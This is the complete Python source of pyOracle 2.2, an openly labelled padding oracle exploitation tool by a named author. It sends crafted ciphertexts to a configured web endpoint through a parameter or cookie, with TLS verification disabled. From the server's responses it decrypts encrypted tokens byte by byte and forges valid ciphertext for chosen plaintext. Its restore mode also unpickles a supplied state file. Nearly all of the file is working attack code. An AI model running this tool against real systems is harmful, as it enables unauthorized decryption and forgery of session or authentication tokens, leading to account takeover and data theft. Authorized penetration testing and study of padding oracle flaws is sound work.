# pyOracle 2.2
# A python padding oracle vulnerability exploitation tool
# By Paul Mueller (@paulmmueller)

import socket
import httpx
import sys
import urllib.parse
import binascii
import argparse
import os.path
from os import path
import configparser
import json
import validators
import pickle
import time
import base64

# httpx does not emit SSL warnings by default when verify=False

def makeCookieString(cookies):
    cookieString = ''
    for k,v in cookies.items():
        cookieString = cookieString + k + "=" + v + ';'
    return cookieString


def encode_multipart(fields):
    boundary = binascii.hexlify(os.urandom(16)).decode('ascii')

    body = (
        "".join("--%s\r\n"
                "Content-Disposition: form-data; name=\"%s\"\r\n"
                "\r\n"
                "%s\r\n" % (boundary, field, value)
                for field, value in fields.items()) +
        "--%s--\r\n" % boundary
    )

    content_type = "multipart/form-data; boundary=%s" % boundary

    return body, content_type

def split_by_n(seq,n):
    """A generator to divide a sequence into chunks of n units."""
    while seq:
        yield seq[:n]
        seq = seq[n:]

# append message to log files
def writeToLog(message):
    ts = str(time.time())
    f = open('pyoracle2.log','a')
    f.write(f"{ts}:{message}\n")
    f.close()

# / and + b64 characters are problematic if they are not URL encoded
def b64urlEncode(string):
    string = string.replace("/","%2F").replace("+","%2B")
    return string

# convert bytes to base64
def bytes_to_base64(bytes_v):
    encoded_data = base64.b64encode(bytes_v)
    num_initial = len(bytes_v)
    padding = { 0:0, 1:2, 2:1 }[num_initial % 3]
    return encoded_data

def handleError(message):
    print(message)
    sys.exit(2)

# Save the current job object to a pickle and write it to a file
def saveState(job):
    ts = time.time()
    if job.currentBlock == (job.blockCount):
        currentBlockStr = "FINAL"
    else:
        currentBlockStr = str(job.currentBlock)
    outputFileName = f"pyOracleState-{job.name}-BLOCK({currentBlockStr})-{str(int(ts))}.pkl"
    pickleOut = open(outputFileName,"wb")
    pickle.dump(job,pickleOut)
    pickleOut.close()

# add padding to the end of the string
def paddify(string,blocksize):
    groups_storage = []
    groups = list(split_by_n(string,blocksize))
    for idx,group in enumerate(groups):

        # if its not the last block, just append
        if (idx + 1) < len(groups):
            groups_storage.append(str(group))
        else:
            temp_group = str(group[:])
            padding_length = blocksize - len(group)
            # if we fall right on a block boundary, we need a full block of padding
            if padding_length == 0:
                padding_length = blocksize
            for i in range(0,padding_length):
                temp_group = temp_group + chr(padding_length)
            groups_storage.append(temp_group)
    paddedstring = ''.join(groups_storage)
    return paddedstring

# The job object holds the state for the encrypt/decrypt operation and contains the majority of the cryptographic code
class Job:
    # set variables for the instance
    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects):

        print('[*]Initializing job....')
        self.name = name
        print(f"\nJob name: {self.name}")
        print(f"[+]Blocksize: {str(blocksize)}")
        self.blocksize = blocksize
        self.mode = mode
        print(f"\n[+]Mode: {str(mode)}")
        self.debug = debug
        if self.debug == True:
            print(f"[+]Debug Mode ON\n")
        else:
            print(f"[.]Debug Mode OFF\n")

        self.sourceString = sourceString
        if self.debug == True:
            print("\n[#]Source String:")
            print(self.sourceString)

        self.ivMode = ivMode
        self.iv = iv
        self.URL = URL
        self.httpMethod = httpMethod
        self.additionalParameters = additionalParameters
        self.httpProxyOn = httpProxyOn
        self.httpProxyIp = httpProxyIp
        self.httpProxyPort = httpProxyPort
        self.headers = headers
        self.cookies = cookies
        self.oracleMode = oracleMode
        self.oracleText = oracleText
        self.vulnerableParameter = vulnerableParameter
        self.inputMode = inputMode
        self.encodingMode = encodingMode
        self.postFormat = postFormat
        self.followRedirects = followRedirects

        # establish state on current completed block
        self.currentBlock = 0

        # establish initial state on solved blocks
        self.solvedBlocks = {}


    def initialize(self):
        proxy = None

        if self.httpProxyOn:
            proxy = f"http://{self.httpProxyIp}:{self.httpProxyPort}"

        self.client = httpx.Client(proxy=proxy, verify=False, follow_redirects=self.followRedirects)

        if self.mode == "decrypt":
            self.decryptInit()
        elif self.mode == "encrypt":
            self.encryptInit()
        else:
            handleError("\n[!]Invalid mode value! Exiting.")


    def oracleCheck(self,result):

        if self.oracleMode == 'search':
            if self.oracleText in result.text:
                return True
            else:
                return False

        elif self.oracleMode == 'negative':
            if self.oracleText not in result.text:
                return True
            else:
                return False

    # make the HTTP request to the target to check current padding array against padding oracle
    def makeRequest(self,encryptedstring):

        tempcookies = self.cookies.copy()

        # if the vulnerable parameter is a cookie, add it
        if self.inputMode == "cookie":
            tempcookies[self.vulnerableParameter] = encryptedstring

        # if there are additional cookies they get added here
        cookieString = makeCookieString(tempcookies)
        self.headers['Cookie'] = cookieString

        if self.httpMethod == "GET":

            urlBuilder = self.URL

            if self.inputMode == 'parameter':
                # add the vulnerable parameter
                urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + encryptedstring

                # if we already set a GET, additionals should start with "&"
                firstDelimiter = "&"
            else:
                firstDelimiter = "?"

            # add the additional parameters
            for idx,additionalParameter in enumerate(self.additionalParameters.items()):
                if idx == 0:
                    delimiter = firstDelimiter
                else:
                    delimiter = '&'
                urlBuilder = urlBuilder + delimiter + additionalParameter[0] + '=' + additionalParameter[1]


            r = self.client.get(urlBuilder,headers=self.headers)

        elif (self.httpMethod == "POST"):

            # first, get the additional parameters
            postData = self.additionalParameters.copy()

            if self.inputMode == 'parameter':

                # add the vulnerable parameter
                postData[self.vulnerableParameter] = encryptedstring

            if (self.postFormat == "form-urlencoded"):
                self.headers["Content-Type"] = "application/x-www-form-urlencoded"
                r = self.client.post(self.URL,data=postData,headers=self.headers)

            elif (self.postFormat == "multipart"):

                postData,multipartContentType = encode_multipart(postData)
                self.headers['Content-Type'] = multipartContentType
                r = self.client.post(self.URL,data=postData,headers=self.headers)

            elif (self.postFormat == "json"):

                self.headers["Content-Type"] = "application/json"
                r = self.client.post(self.URL,json=postData,headers=self.headers)
        return r

    def fakeIV(self):
        return [0] * self.blocksize

    def printProgress(self):
        print(f"\n[!] Solved {self.currentBlock} blocks out of {self.blockCount}")
        print("##################################")
        try:
            print(''.join(self.solvedBlocks.values()))
        except:
            print(b''.join(self.solvedBlocks.values()))
        print("##################################")

    def verbosePrint(self,padding_array,tempTokenBytes,tempToken,resultText):
        print('[!]LENGTH OF tempTokenBytes: ' + str(len(tempTokenBytes)))
        print('[!]Full result text: ' + resultText)
        print('[+]Current padding array: ')
        print('*************************************************')
        print(padding_array)
        print('*************************************************\n')

        print('[*]This is what the encrypted string would look like')
        print('*************************************************')
        print(tempToken)
        print('*************************************************\n')

    def encryptBlockFail(self,padding_array,tempTokenBytes):
        self.decryptBlockFail(padding_array,tempTokenBytes)


    def decryptBlockFail(self,padding_array,tempTokenBytes):

        writeToLog('No characters produced valid padding. For the current block aborting')
        print('\n[!]ERROR! No characters produced valid padding! This must mean there was previously an irrecoverable error!')
        print('*************************************************\n')
        raise Exception("Block failed to decrypt/encrypt, likely a random network error.")
        #sys.exit(2)

    def encryptBlock(self):
        print(f'[!]Starting Analysis for block number: {self.currentBlock + 1} OF {self.blockCount}\n')
        padding_array = [0] * self.blocksize
        solved_intermediates = {} # a place to store the solved intermediates
        solved_crypto = {}
        padding_num = 1
        currentbyte = self.blocksize - 1
        # we start with zeros and back calculate the previous block to match

        if self.currentBlock == 0:
             previousBlock = [0] * self.blocksize
        else:
            previousBlock = list(bytearray(self.solvedBlocks[self.currentBlock - 1]))

        for n in range(0,self.blocksize):
            tempblock = self.blocks[self.currentBlock][:]

            if self.debug:
                print('[*]CURRENT BLOCK PLAINTEXT:')
                print('*************************************************')
                print(tempblock)
                print('*************************************************\n')

            count = 0
            solved = False
            while solved == False:
                if count > 255:
                    self.encryptBlockFail(padding_array,tempTokenBytes)
                padding_array[currentbyte] = count #keep changing the same byte in the previous block

                for k,v in solved_intermediates.items(): #populate the previous bytes with the correct values based on the changing padding but constant intermediates
                    padding_array[k] = v ^ padding_num
                tempTokenBytes = bytes(self.fakeIV() + padding_array + previousBlock) 

                if self.encodingMode == 'base64':
                    tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes))

                if self.encodingMode == 'base64Url':
                    tempToken = bytes_to_base64(bytes(tempTokenBytes)).decode().replace('=','').replace("+","-").replace('/','_')

                if self.encodingMode == 'hex':
                    tempToken = tempTokenBytes.hex().upper()
                result = self.makeRequest(tempToken) #make the request with the messed with encryptedstring

                if self.debug:
                    print('[!]Full result text: ' + result.text)
                    print('[+]Current padding array: ')
                    print('*************************************************')
                    print(padding_array)
                    print('*************************************************\n')

                    print('[*]This is what the encrypted value would look like')
                    print('*************************************************')
                    print(tempToken)
                    print('*************************************************')

                # if the oracleCheck failed... (not solved)
                if not self.oracleCheck(result):
                    count = count + 1  #increment the count    
                else:
                    solved = True
                    print('[+]SOLVED FOR BYTE NUMBER: ' + str(currentbyte))
                    currenti = count ^ padding_num #if we solved it, get the current intermediate
                    print('[+]The current I value is: ' + str(currenti))
                    solved_intermediates[currentbyte] = currenti    

                    #XOR the intermediate and the actual plain text to determine the cipher byte for the next (previous) block      
                    currentcrypto = (self.blocks[self.currentBlock][currentbyte]) ^ currenti 
                    print(f'[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n')
                    solved_crypto[currentbyte] = currentcrypto
                    if self.debug:
                        print(f'[+]cross-check padding level: {str(currenti ^ padding_array[currentbyte])}\n')

            padding_num = padding_num + 1 #increment padding_num and decrement currentbyte
            currentbyte = currentbyte - 1

        blockresult = bytes(reversed(list(solved_crypto.values())))
        print('\n*************************************************')
        print('[*]BLOCK SOLVED:')
        print(blockresult)
        print('*************************************************\n')
        writeToLog(f'[!]BLOCK SOLVED: {blockresult}')
        return blockresult

    def decryptBlock(self):
        print(f"[!]Starting Analysis for block number: {self.currentBlock} OF {self.blockCount}\n")
        padding_array = [0] * self.blocksize
        solved_intermediates = {} # a place to store the solved intermediates
        solved_reals = {}
        padding_num = 1 #starting at padding one, increase as we work backwards
        currentbyte = self.blocksize - 1 #start at the last byte according to the length of block
        # if we are on the first block use the IV as the 'previousBlock'
        if self.currentBlock == 0:
            if self.ivMode == "firstblock" or self.ivMode == "knownIV":
                previousBlock = self.iv
            else:
                #This should only happen if we are using unknown IV
                currentIV = self.fakeIV()
        else:
            previousBlock = self.blocks[self.currentBlock - 1]
        for n in range(0,self.blocksize):
            tempblock = self.blocks[self.currentBlock][:] #make a copy of the byte array that we can mess with

            if self.debug:
                print('[*]CURRENT BLOCK DECIMAL:')
                print('*************************************************')
                print(tempblock)
                print('*************************************************\n')

            count = 0
            solved = False
            while solved == False:
                # We tried all possible bytes for this position and failed. Something isn't working. 
                if count > 255:
                    self.decryptBlockFail(padding_array,tempTokenBytes)
                padding_array[currentbyte] = count #keep changing the same byte in the previous block
                for k,v in solved_intermediates.items():
                    padding_array[k] = v ^ padding_num

                tempTokenBytes = bytearray(self.fakeIV() + padding_array + tempblock) #put the bytes back together into a string

                if self.encodingMode == 'base64':
                    tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string

                if self.encodingMode == 'base64Url':
                    tempToken = bytes_to_base64(tempTokenBytes).decode().replace('=','').replace("+","-").replace('/','_')

                if self.encodingMode == 'hex':
                    tempToken = tempTokenBytes.hex().upper()

                result = self.makeRequest(tempToken) #make the request with the messed with encryptedstring

                if self.debug:
                    self.verbosePrint(padding_array,tempTokenBytes,tempToken,result.text)

                # if the oracleCheck failed... (not solved)
                if not self.oracleCheck(result):
                    count = count + 1  #increment the count

                else:
                    print('[+]SOLVED FOR BYTE NUMBER: ' + str(currentbyte))
                    solved = True
                    currenti = count ^ padding_num #if we solved it, get the current intermediate
                    print('[+]The current I value is: ' + str(currenti))
                    solved_intermediates[currentbyte] = currenti
                    currentreal = (previousBlock[currentbyte]) ^ currenti #use the current intermediate, and the real last block encryption to find the current real
                    print('[+]real value of last char is: ' + str(currentreal) + '\n')
                    solved_reals[currentbyte] = currentreal
                    if self.debug:
                        print('[+]cross-check padding level:' + str(currenti ^ padding_array[currentbyte]) + '\n')
            # increment padding_num and decrement currentbyte
            padding_num = padding_num + 1
            currentbyte = currentbyte - 1

        blockresult = bytes(reversed(list(solved_reals.values())))

        # Attempt to convert to an ascii string. If it fails, something probably went wrong.
        try:
            blockresultString = blockresult.decode()
        except:
            blockresultString = blockresult.decode('latin1')
            print("Failed sanity check, but bypassing for now")
            #raise Exception("Block failed sanity check!")
        writeToLog(f'[!]BLOCK SOLVED: {blockresult}')
        print(f'[!]BLOCK SOLVED: {blockresult}')
        return blockresult

    def nextBlock(self):

        if self.mode == 'decrypt':
            try:
                result = self.decryptBlock()

            except Exception as e:
                writeToLog(f'[!] decryption of block {self.currentBlock} failed. Error message: {e}')
                print(f'[!] decryption of block {self.currentBlock} failed. Error message: {e}')
                return 1
        if self.mode == 'encrypt':
            try:
                result = self.encryptBlock()
            except Exception as e:
                writeToLog(f'[!] encryption of block {self.currentBlock} failed. Error message: {e}')
                print(f'[!] encryption of block {self.currentBlock} failed. Error message: {e}')
                return 1

        # add the result to solvedBlocks. We may have to remove it again if we fail the oracleCheck sanity check.
        self.solvedBlocks[self.currentBlock] = result

        if self.mode == 'encrypt':

            # combine all of the blocks into one decimal list
            joinedCrypto = b''.join(reversed(list(self.solvedBlocks.values())))

            # add in the "first" (last) block of all 0's
            joinedCrypto = b''.join([joinedCrypto,bytes([0] * self.blocksize)])

            if self.encodingMode == 'base64':
                encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))

            if self.encodingMode == "base64Url":
                encryptTemp = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')

            if self.encodingMode == 'hex':
                encryptTemp = joinedCrypto.hex().upper()
            oracleCheckResult = self.makeRequest(encryptTemp) #make the request with the messed with encryptedstring

            #if the oracleCheck failed... (not solved)
            if not self.oracleCheck(oracleCheckResult):
                writeToLog(f'[!] encryption of block {self.currentBlock} failed. Reason: Sanity Check failed.')
                print('block failed sanity check!')
                # back out of the block
                del self.solvedBlocks[self.currentBlock]
                return 1

        return 0

    # initialize variables necessary to perform decryption.
    def decryptInit(self):

        # Run the string through a URL decoder
        unquoted_sourcestring = urllib.parse.unquote(self.sourceString)

        # decode the encrypted string

        if (self.encodingMode == 'base64') or (self.encodingMode == 'base64Url'):
            # some base64 implementations strip padding, if so we need to add it back
            unquoted_sourcestring += '=' * (len(unquoted_sourcestring) % 4)

        if self.encodingMode == 'base64Url':
            unquoted_sourcestring = unquoted_sourcestring.replace('-','+').replace('_','/')

        if (self.encodingMode == 'base64') or (self.encodingMode == 'base64Url'):
            decoded_sourcestring = binascii.a2b_base64(unquoted_sourcestring)

        if self.encodingMode == 'hex':
            decoded_sourcestring = bytes.fromhex(unquoted_sourcestring)

        bytemap = list(decoded_sourcestring)

        # Save the bytemap to the object in case operation is interupted
        self.bytemap = bytemap

         # initialize the blocks array
        self.blocks = []

        # we have to recreate the byte array, not just reference it
        actualBlocks = self.bytemap[:]

        #Get the block count and save it to the instance
        print(actualBlocks)
        print(int(len(actualBlocks)))
        self.blockCount = int((len(actualBlocks) / self.blocksize))

        # if the mode is 'firstblock' we need to remove the first block and assign it as the IV
        if self.ivMode == "firstblock":
            self.iv = actualBlocks[0:self.blocksize]
            # push forward one block length
            actualBlocks = actualBlocks[self.blocksize:]
            self.blockCount = self.blockCount - 1

        # if the mode is unknown, we can just set the IV to zeros. The first block won't work, but everything else will.
        elif self.ivMode == 'unknown':
            self.iv = [0] * self.blocksize

        # if the mode is knownIV, it is already set

        # Display the block count
        print(f"\n[+] (non-IV) Block Count: {self.blockCount}")

        if self.debug:
            print('\n[#]decimal representation of the decoded token value'  + '\n')
            print('*************************************************')
            print(self.bytemap)
            print('*************************************************\n')

        # iterate through the block array and separate the blocks
        for x in range (0,self.blockCount):

            # take the next block off and add it to self.blocks
            self.blocks.append(actualBlocks[0:self.blocksize])

            # push forward one block length
            actualBlocks = actualBlocks[self.blocksize:]

        if self.debug:
            print('*************************************************\n')
            print('\n[*]Initialization Vector (IV) value:')
            print(self.iv)
            print('*************************************************\n')

    def encryptInit(self):

        # set the text to encrypt and paddify it
        self.encryptText = paddify(self.sourceString,self.blocksize)
        print(f"[+]Raw encrypt string: {self.sourceString}")
        print(f"[+]Padded encrypt string: {self.encryptText}")

        # the mode is knownIV or unknownIV, we cant encrypt the first block. It should be possible to encrypt all other blocks, but we will add this later.
        if not self.ivMode == "firstblock":
            print("[!]Support for encrypting with knownIV or unknownIV mode is not currently in place")
            sys.exit(2)

        # Save the bytemap to the object in case operation is interupted
        bytemap = str.encode(self.encryptText)
        self.bytemap = bytemap

         # initialize the blocks array
        self.blocks = []

        # we have to recreate the byte array, not just reference it
        actualBlocks = self.bytemap[:]
        # print(actualBlocks)

        #Get the block count and save it to the instance
        self.blockCount = int((len(self.bytemap) / self.blocksize))

        # iterate through the block array and separate the blocks
        for x in range (0,self.blockCount):

            # take the next block off and add it to self.blocks
            self.blocks.append(actualBlocks[0:self.blocksize])

            # push forward one block length
            actualBlocks = actualBlocks[self.blocksize:]

        # Encryption works by starting at the last block and working backwards. Therefore, we will reverse the blocks.
        self.blocks = list(reversed(self.blocks))


def main():
    # argparse setup
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--restore", type=str,help="Specify a state file to restore from")
    parser.add_argument("-i", "--input", type=str,help="Specify either the ciphertext (for decrypt) or plainttext (for encrypt)")
    parser.add_argument("-m", "--mode", type=str,help="Select encrypt or decrypt mode")
    parser.add_argument("-d", "--debug", action="store_true", help="increase output verbosity")
    parser.add_argument("-c", "--config", type=str, help="Specify the configuration file")
    args = parser.parse_args()


    # check to see if we are performing a restore operation
    if args.restore:
        # if we are doing a restore, no other flags should be set
        if (args.input or args.mode or args.debug):
            handleError("\n[x] In restore mode no other options should be set! Exiting.")

    # make sure that required parameters are present and validated
    else:
        if ((not args.mode) or (not args.input) or (not args.config)):
            handleError("\n[x] Mode (-m), Config (-c), and input (-i) are required parameters. Exiting")

        if ((args.mode != 'encrypt') and (args.mode != 'decrypt') and (args.mode != 'd') and (args.mode != 'e')):
            handleError("\n[x] Mode must be set to either 'encrypt' / 'decrypt' or e / d. Exiting.")
        else:
            if args.mode == 'e':
                args.mode = 'encrypt'
            if args.mode == 'd':
                args.mode = 'decrypt'

    # Proceed with resume function
    if args.restore:
        print(f"\n[!]RESTORE MODE INTIATED. Attempting to restart job from file {args.restore}")

        pickleFile = open(args.restore, 'rb')
        job = pickle.load(pickleFile)
        pickleFile.close()
        print(job.name)
        print(job.solvedBlocks)
        print(job.currentBlock)
        job.printProgress()

    # Proceed with a new job
    else:

        # ensure the provided configuration file is actually there
        if not path.exists(args.config):
            handleError("[x]Cannot find configuration file at path: {}. Exiting")


        # config parser setup

        config = configparser.RawConfigParser()
        config.read(args.config)
        sections = config.sections()

        name = config['default']['name']
        URL = config['default']['URL']
        httpMethod = config['default']['httpMethod']
        additionalParameters = json.loads(config['default']['additionalParameters'])
        blocksize = config['default']['blocksize']
        httpProxyOn = config['default'].getboolean('httpProxyOn')
        httpProxyIp = config['default']['httpProxyIp']
        httpProxyPort = config['default']['httpProxyPort']
        headers = json.loads(config['default']['headers'])
        cookies = json.loads(config['default']['cookies'])
        ivMode = config['default']['ivMode']
        iv = json.loads(config['default']['iv'])
        oracleMode = config['default']['oracleMode']
        oracleText  = config['default']['oracleText']
        vulnerableParameter = config['default']['vulnerableParameter']
        inputMode = config['default']['inputMode']
        encodingMode = config['default']['encodingMode']
        postFormat = config['default']['postFormat']
        followRedirects = config['default'].getboolean('followRedirects')
        # config value validation
        # validate oracleMode
        if not oracleMode:
            handleError("[x]CONFIG ERROR: oracleMode required")

        else:
            if ((oracleMode != "search") and (oracleMode != "negative")):
                handleError("[x]CONFIG ERROR: invalid oracleMode")

        # validate encodingMode
        if not encodingMode:
            handleError("[x]CONFIG ERROR: encodingMode required")

        else:
            validEncodingModes = ['base64','base64Url','hex']
            if (encodingMode not in validEncodingModes):
                handleError("[x]CONFIG ERROR: invalid encodingMode")

        # Validate HTTP Method
        if ((httpMethod != "GET") and (httpMethod != "POST")):
            handleError("[x]CONFIG ERROR: httpMethod not valid. Must be 'GET' or 'POST'")

        # Validate POST format
        if ((httpMethod == "POST")):

            if postFormat == "form-urlencoded":
                pass

            elif postFormat == "multipart":
                pass

            elif postFormat == "json":
                pass
            else:
                handleError("[x]CONFIG ERROR: When httpMethod is POST postFormat must be 'form-urlencoded', 'multipart', or 'json'")
        # validate proxy IP
        if httpProxyIp:
            try:
                socket.inet_aton(httpProxyIp)
            except socket.error:
                handleError("[x]CONFIG ERROR: proxy ip is not a valid IP address.")

        # validate proxy port
        if httpProxyPort:
            try:
                httpProxyPort = int(httpProxyPort)
            except:
                handleError("[x]CONFIG ERROR: proxy port is not valid INT")

            if not (httpProxyPort <= 65535):
                handleError("[x]CONFIG ERROR: proxy port is not a valid port number")

        # validate block size
        try:
            blocksize = int(blocksize)
        except:
            handleError("[x]CONFIG ERROR: blocksize must be INT.")



        if not validators.url(URL):
            handleError("[x]CONFIG ERROR: URL is not valid.")

        # validate ivMode
        if not ivMode:
            handleError("[x]CONFIG ERROR: ivMode is required.")
        else:
            if not ((ivMode == 'firstblock') or (ivMode == 'knownIV') or (ivMode == 'unknown')):
                print(f"[x]CONFIG ERROR: iVMode: '{ivMode}' invalid.")
                handleError("[!]Valid ivMode values: firstblock, knownIV, or unknown")

        # validate iv

        # iv required if in knownIV mode
        if ivMode == 'knownIV':
            if not iv:
                handleError("[x]CONFIG ERROR: iv is required when in IV mode")

            if len(iv) != blocksize:
                handleError("[x]CONFIG ERROR: iv must be the same length as blocksize")

            if not (all(isinstance(x, int) for x in iv)):
                handleError("[x]CONFIG ERROR: IV is not properly formatted. Not all values are type INT")


        # Initialize Job object
        job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects)
        job.initialize()

    print(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
    writeToLog(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')

    while job.currentBlock < (job.blockCount):
        result = job.nextBlock()
        if result == 0:

            #Since the block was sucessful, roll to the next one
            job.currentBlock = job.currentBlock + 1

            #Save the current state so that it can be resumed later
            saveState(job)

            #Print the current progress so far
            job.printProgress()

        else:
            print(f"[!]Something went wrong with block {job.currentBlock}. Will repeat block")


    print(f"[!]All blocks completed")

    # if we just completed an encrypt operation, we need to reverse the order, join the pieces, and base64
    if job.mode == "encrypt":


        for xxx in range(0,len(job.solvedBlocks.values())):

            # combine all of the blocks into one decimal list
            joinedCrypto = b''.join(reversed(list(job.solvedBlocks.values())))

            #joinedCrypto = b''.join(list(job.solvedBlocks.values()))
            joinedCrypto = joinedCrypto[(-1 - xxx) * 16:]

            # add in the "first" (last) bock of all 0's
            joinedCrypto = b''.join([joinedCrypto,bytes([0] * job.blocksize)])

        if job.encodingMode == 'base64':
            encryptFinal = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))

        if job.encodingMode == 'base64Url':
            encryptFinal = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')

        if job.encodingMode == 'hex':
            encryptFinal = joinedCrypto.hex().upper()

        print(f"[!]Encrypt final result: {encryptFinal}")

    # All blocks completed

    # Save final state
    #saveState(job)

    if job.mode == "decrypt":
        # No output needed, final combined result should have been printed when last block was completed
        pass

    #job.printProgress()


if __name__ == "__main__":
    main()
